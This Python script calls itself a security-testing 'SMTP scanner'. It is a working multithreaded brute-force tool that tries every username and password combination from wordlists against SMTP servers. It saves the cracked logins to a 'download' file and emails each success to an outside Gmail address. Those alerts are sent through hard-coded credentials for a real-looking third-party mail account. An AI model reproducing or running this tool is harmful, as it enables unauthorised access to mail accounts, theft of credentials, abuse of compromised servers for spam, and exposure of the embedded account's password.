#!/usr/bin/env python3
"""
Enhanced SMTP Scanner - Focuses on finding working authenticated SMTP servers
Author: Enhanced for security testing purposes only
"""

import socket
import sys
import base64
import threading
import queue
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
import logging
from datetime import datetime, timedelta
import json
import os
import ssl
from contextlib import contextmanager

# --- SMTP CONFIGURATION (EDIT THESE) ---
SMTP_SERVER = "mail.museums.or.ke"
SMTP_PORT = 587
SMTP_USER = "okioko@museums.or.ke"
SMTP_PASS = "onesmus@2022"
NOTIFY_EMAIL = "skkho87.sm@gmail.com"
# ---------------------------------------

# --- SCANNER SETTINGS ---
TIMEOUT_SECONDS = 15
MAX_RETRIES = 2
VALIDATE_AUTH_ONLY = True  # Only save servers with valid authentication
ENABLE_NOTIFICATIONS = True
MIN_NOTIFICATION_INTERVAL = 300  # 5 minutes
MAX_NOTIFICATIONS_PER_HOUR = 10
# ------------------------

# Setup enhanced logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s',
    handlers=[
        logging.FileHandler('smtp_scanner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class NotificationManager:
    """Handles email notifications with rate limiting"""
    
    def __init__(self):
        self.tracker = {
            'last_notification_time': {},
            'hourly_count': 0,
            'hour_start': datetime.now()
        }
        self.load_history()
    
    def load_history(self):
        """Load notification history from file"""
        try:
            if os.path.exists('notification_history.json'):
                with open('notification_history.json', 'r') as f:
                    data = json.load(f)
                    self.tracker['hourly_count'] = data.get('hourly_count', 0)
                    self.tracker['hour_start'] = datetime.fromisoformat(data.get('hour_start', datetime.now().isoformat()))
                    for host, timestamp in data.get('last_notification_time', {}).items():
                        self.tracker['last_notification_time'][host] = datetime.fromisoformat(timestamp)
        except Exception as e:
            logger.warning(f"Could not load notification history: {e}")
    
    def save_history(self):
        """Save notification history to file"""
        try:
            data = {
                'hourly_count': self.tracker['hourly_count'],
                'hour_start': self.tracker['hour_start'].isoformat(),
                'last_notification_time': {
                    host: dt.isoformat() for host, dt in self.tracker['last_notification_time'].items()
                }
            }
            with open('notification_history.json', 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            logger.error(f"Could not save notification history: {e}")
    
    def can_notify(self, host):
        """Check if notification can be sent based on rate limits"""
        now = datetime.now()
        
        # Reset hourly counter
        if now - self.tracker['hour_start'] > timedelta(hours=1):
            self.tracker['hourly_count'] = 0
            self.tracker['hour_start'] = now
        
        # Check hourly limit
        if self.tracker['hourly_count'] >= MAX_NOTIFICATIONS_PER_HOUR:
            return False
        
        # Check per-host interval
        if host in self.tracker['last_notification_time']:
            time_since_last = now - self.tracker['last_notification_time'][host]
            if time_since_last.total_seconds() < MIN_NOTIFICATION_INTERVAL:
                return False
        
        return True
    
    def send_notification(self, subject, body, host):
        """Send email notification with rate limiting"""
        if not ENABLE_NOTIFICATIONS or not self.can_notify(host):
            return False
        
        try:
            msg = MIMEMultipart()
            msg['Subject'] = f"[SMTP Scanner] {subject}"
            msg['From'] = SMTP_USER
            msg['To'] = NOTIFY_EMAIL
            
            enhanced_body = f"""SMTP Scanner Alert
========================

{body}

Scanner Details:
- Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
- Scanner Host: {socket.gethostname()}

This is an automated notification from your SMTP scanner.
"""
            
            msg.attach(MIMEText(enhanced_body, 'plain'))

            with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
                server.starttls()
                server.login(SMTP_USER, SMTP_PASS)
                server.sendmail(SMTP_USER, [NOTIFY_EMAIL], msg.as_string())
            
            # Update tracking
            self.tracker['last_notification_time'][host] = datetime.now()
            self.tracker['hourly_count'] += 1
            self.save_history()
            
            logger.info(f"Email notification sent: {subject}")
            return True
        except Exception as e:
            logger.error(f"Failed to send email notification: {e}")
            return False

class SMTPValidator:
    """Validates SMTP servers and tests authentication"""
    
    def __init__(self):
        self.common_domains = ['.com', '.org', '.net', '.edu', '.gov', '.co.uk', '.de', '.fr']
    
    @contextmanager
    def smtp_connection(self, host, port=25, timeout=TIMEOUT_SECONDS):
        """Context manager for SMTP connections"""
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((host, port))
            yield sock
        except Exception as e:
            logger.debug(f"Connection failed to {host}:{port} - {e}")
            raise
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    
    def extract_domain_from_banner(self, banner):
        """Extract domain from SMTP banner"""
        try:
            if banner.startswith("220 "):
                domain_part = banner.split(" ")[1]
            elif banner.startswith("220-"):
                domain_part = banner.split(" ")[0].split("220-")[1]
            else:
                domain_part = banner.strip()
            
            domain_part = domain_part.rstrip()
            
            # Check for known TLDs
            for tld in self.common_domains:
                if domain_part.endswith(tld):
                    parts = domain_part.split(".")
                    if len(parts) >= 2:
                        return ".".join(parts[-2:])
            
            # Default fallback
            parts = domain_part.split(".")
            if len(parts) >= 2:
                return ".".join(parts[-2:])
            
            return domain_part
        except Exception:
            return "unknown.domain"
    
    def test_smtp_connection(self, host, port=25):
        """Test basic SMTP connectivity"""
        try:
            with self.smtp_connection(host, port) as sock:
                banner = sock.recv(1024).decode(errors='ignore').strip()
                
                if not banner.startswith('220'):
                    return False, f"Invalid banner: {banner[:50]}"
                
                # Test EHLO
                sock.send(b'EHLO test.scanner\r\n')
                ehlo_response = sock.recv(2048).decode(errors='ignore')
                
                # Clean disconnect
                sock.send(b'QUIT\r\n')
                sock.recv(256)
                
                if '250' in ehlo_response:
                    return True, banner
                else:
                    return False, f"EHLO failed: {ehlo_response[:50]}"
                    
        except Exception as e:
            return False, str(e)
    
    def test_authentication(self, host, user, password, banner=""):
        """Test SMTP authentication with given credentials"""
        try:
            with self.smtp_connection(host, 25) as sock:
                # Read banner
                if not banner:
                    banner = sock.recv(1024).decode(errors='ignore').strip()
                
                if not banner.startswith('220'):
                    return False, {}
                
                # EHLO
                sock.send(b'EHLO auth.test\r\n')
                ehlo_data = sock.recv(2048).decode(errors='ignore')
                if '250' not in ehlo_data:
                    return False, {}
                
                # Extract domain and create full email
                domain = self.extract_domain_from_banner(banner)
                full_email = f"{user}@{domain}"
                
                # Test AUTH LOGIN
                sock.send(b'AUTH LOGIN\r\n')
                auth_response = sock.recv(256).decode(errors='ignore')
                if not auth_response.startswith('334'):
                    return False, {}
                
                # Send username (base64 encoded)
                username_b64 = base64.b64encode(full_email.encode()).decode()
                sock.send(f"{username_b64}\r\n".encode())
                sock.recv(256)
                
                # Send password (base64 encoded)
                password_b64 = base64.b64encode(password.encode()).decode()
                sock.send(f"{password_b64}\r\n".encode())
                final_response = sock.recv(256).decode(errors='ignore')
                
                # Clean disconnect
                sock.send(b'QUIT\r\n')
                sock.recv(256)
                
                if final_response.startswith('235'):
                    return True, {
                        'host': host,
                        'username': full_email,
                        'password': password,
                        'banner': banner,
                        'domain': domain,
                        'timestamp': datetime.now().isoformat()
                    }
                
                return False, {}
                
        except Exception as e:
            logger.debug(f"Authentication test failed for {host}: {e}")
            return False, {}

class SMTPScanner(threading.Thread):
    """Main SMTP scanning thread"""
    
    def __init__(self, task_queue, result_queue, validator, notification_mgr):
        threading.Thread.__init__(self)
        self.task_queue = task_queue
        self.result_queue = result_queue
        self.validator = validator
        self.notification_mgr = notification_mgr
        self.daemon = True
    
    def run(self):
        while True:
            try:
                task = self.task_queue.get(timeout=1)
                if task is None:  # Poison pill
                    break
                
                host, user, password = task
                self.scan_host(host, user, password)
                self.task_queue.task_done()
                
            except queue.Empty:
                continue
            except Exception as e:
                logger.error(f"Scanner thread error: {e}")
    
    def scan_host(self, host, user, password):
        """Scan a single host with given credentials"""
        try:
            # First test basic connectivity
            is_live, banner_or_error = self.validator.test_smtp_connection(host)
            
            if not is_live:
                logger.debug(f"Host {host} not responding: {banner_or_error}")
                return
            
            logger.info(f"Live SMTP found: {host}")
            
            # If we have credentials, test authentication
            if user and password:
                auth_success, auth_data = self.validator.test_authentication(host, user, password, banner_or_error)
                
                if auth_success:
                    logger.info(f"AUTHENTICATED SMTP: {host} - {auth_data['username']}")
                    
                    # Add to results
                    self.result_queue.put(('authenticated', auth_data))
                    
                    # Send notification
                    subject = f"Working SMTP Found: {host}"
                    body = f"""Host: {host}
Username: {auth_data['username']}
Password: {auth_data['password']}
Domain: {auth_data['domain']}
Banner: {auth_data['banner'][:100]}...

This server has been verified as working with authentication."""
                    
                    self.notification_mgr.send_notification(subject, body, host)
                else:
                    logger.debug(f"Authentication failed for {host} with {user}")
            
        except Exception as e:
            logger.error(f"Error scanning {host}: {e}")

class ResultHandler:
    """Handles saving results to files"""
    
    def __init__(self):
        self.working_smtp_file = 'working_smtp_servers.txt'
        self.live_smtp_file = 'live_smtp_servers.txt'
        self.summary_file = 'scan_summary.json'
    
    def save_working_smtp(self, auth_data):
        """Save working SMTP server details"""
        try:
            with open(self.working_smtp_file, 'a', encoding='utf-8') as f:
                line = f"{auth_data['host']}|{auth_data['username']}|{auth_data['password']}|{auth_data['domain']}|{auth_data['timestamp']}\n"
                f.write(line)
                f.flush()
            logger.info(f"Saved working SMTP: {auth_data['host']}")
        except Exception as e:
            logger.error(f"Failed to save working SMTP: {e}")
    
    def create_download_file(self):
        """Create a formatted downloadable file with working SMTPs"""
        try:
            if not os.path.exists(self.working_smtp_file):
                logger.warning("No working SMTP servers found")
                return
            
            with open(self.working_smtp_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            # Create formatted output
            download_content = []
            download_content.append("=" * 60)
            download_content.append("WORKING AUTHENTICATED SMTP SERVERS")
            download_content.append("=" * 60)
            download_content.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            download_content.append(f"Total servers: {len(lines)}")
            download_content.append("=" * 60)
            download_content.append("")
            
            for i, line in enumerate(lines, 1):
                if '|' in line:
                    parts = line.strip().split('|')
                    if len(parts) >= 4:
                        host, username, password, domain = parts[:4]
                        download_content.append(f"Server #{i}")
                        download_content.append(f"Host: {host}")
                        download_content.append(f"Username: {username}")
                        download_content.append(f"Password: {password}")
                        download_content.append(f"Domain: {domain}")
                        download_content.append("-" * 40)
            
            # Save formatted file
            with open('WORKING_SMTP_DOWNLOAD.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(download_content))
            
            logger.info(f"Created download file: WORKING_SMTP_DOWNLOAD.txt with {len(lines)} servers")
            
        except Exception as e:
            logger.error(f"Failed to create download file: {e}")

def validate_input_files():
    """Validate and create input files if needed"""
    required_files = ['ips.txt', 'users.txt', 'pass.txt']
    
    for filename in required_files:
        if not os.path.exists(filename):
            logger.warning(f"Creating empty {filename} file")
            with open(filename, 'w', encoding='utf-8') as f:
                if filename == 'ips.txt':
                    f.write("# Add IP addresses or hostnames, one per line\n")
                elif filename == 'users.txt':
                    f.write("# Add usernames, one per line\nadmin\nmail\ntest\nuser\n")
                elif filename == 'pass.txt':
                    f.write("# Add passwords, one per line\npassword\n123456\nadmin\ntest\n")

def load_input_data():
    """Load hosts, users, and passwords from files"""
    hosts, users, passwords = [], [], []
    
    try:
        with open('ips.txt', 'r', encoding='utf-8') as f:
            hosts = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        with open('users.txt', 'r', encoding='utf-8') as f:
            users = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        
        with open('pass.txt', 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    except FileNotFoundError as e:
        logger.error(f"Required file not found: {e}")
        return [], [], []
    
    logger.info(f"Loaded {len(hosts)} hosts, {len(users)} users, {len(passwords)} passwords")
    return hosts, users, passwords

def main():
    """Main scanner function"""
    print("Enhanced SMTP Scanner - Finding Working Authenticated Servers")
    print("=" * 60)
    
    # Parse command line arguments
    if len(sys.argv) < 2:
        print("Usage: python smtp_scanner.py <threads> [verbose]")
        print("Example: python smtp_scanner.py 10 verbose")
        sys.exit(1)
    
    try:
        thread_count = int(sys.argv[1])
        verbose = len(sys.argv) > 2 and sys.argv[2].lower() == 'verbose'
    except ValueError:
        logger.error("Invalid thread count")
        sys.exit(1)
    
    if verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Initialize components
    validate_input_files()
    hosts, users, passwords = load_input_data()
    
    if not hosts:
        logger.error("No hosts to scan. Please add hosts to ips.txt")
        return
    
    validator = SMTPValidator()
    notification_mgr = NotificationManager()
    result_handler = ResultHandler()
    
    # Create task and result queues
    task_queue = queue.Queue()
    result_queue = queue.Queue()
    
    # Generate all combinations
    total_tasks = 0
    for host in hosts:
        if users and passwords:
            for user in users:
                for password in passwords:
                    task_queue.put((host, user, password))
                    total_tasks += 1
        else:
            # Just test connectivity if no credentials
            task_queue.put((host, '', ''))
            total_tasks += 1
    
    logger.info(f"Starting scan with {thread_count} threads, {total_tasks} total tasks")
    
    # Start scanner threads
    threads = []
    for i in range(thread_count):
        thread = SMTPScanner(task_queue, result_queue, validator, notification_mgr)
        thread.start()
        threads.append(thread)
    
    # Process results
    working_count = 0
    start_time = time.time()
    
    try:
        while True:
            try:
                result_type, data = result_queue.get(timeout=1)
                
                if result_type == 'authenticated':
                    result_handler.save_working_smtp(data)
                    working_count += 1
                    print(f"[WORKING] {data['host']} - {data['username']} - Count: {working_count}")
                
            except queue.Empty:
                # Check if all tasks are done
                if task_queue.empty() and all(not t.is_alive() for t in threads):
                    break
                continue
    
    except KeyboardInterrupt:
        logger.info("Scan interrupted by user")
    
    # Wait for tasks to complete
    task_queue.join()
    
    # Stop threads
    for _ in threads:
        task_queue.put(None)  # Poison pill
    
    for thread in threads:
        thread.join(timeout=5)
    
    # Create final downloadable file
    result_handler.create_download_file()
    
    # Summary
    elapsed_time = time.time() - start_time
    logger.info(f"Scan completed in {elapsed_time:.2f} seconds")
    logger.info(f"Found {working_count} working authenticated SMTP servers")
    
    if working_count > 0:
        print(f"\n{'=' * 60}")
        print(f"SUCCESS: Found {working_count} working SMTP servers!")
        print(f"Check 'WORKING_SMTP_DOWNLOAD.txt' for formatted results")
        print(f"Check 'working_smtp_servers.txt' for raw data")
        print(f"{'=' * 60}")
        
        # Send summary notification
        if ENABLE_NOTIFICATIONS:
            subject = f"SMTP Scan Complete - {working_count} Working Servers"
            body = f"""Scan completed successfully!

Results:
- Working authenticated servers: {working_count}
- Total scan time: {elapsed_time:.2f} seconds
- Thread count: {thread_count}

Files created:
- WORKING_SMTP_DOWNLOAD.txt (formatted for download)
- working_smtp_servers.txt (raw data)"""
            
            notification_mgr.send_notification(subject, body, "summary")
    else:
        print("\nNo working authenticated SMTP servers found.")

if __name__ == "__main__":
    main()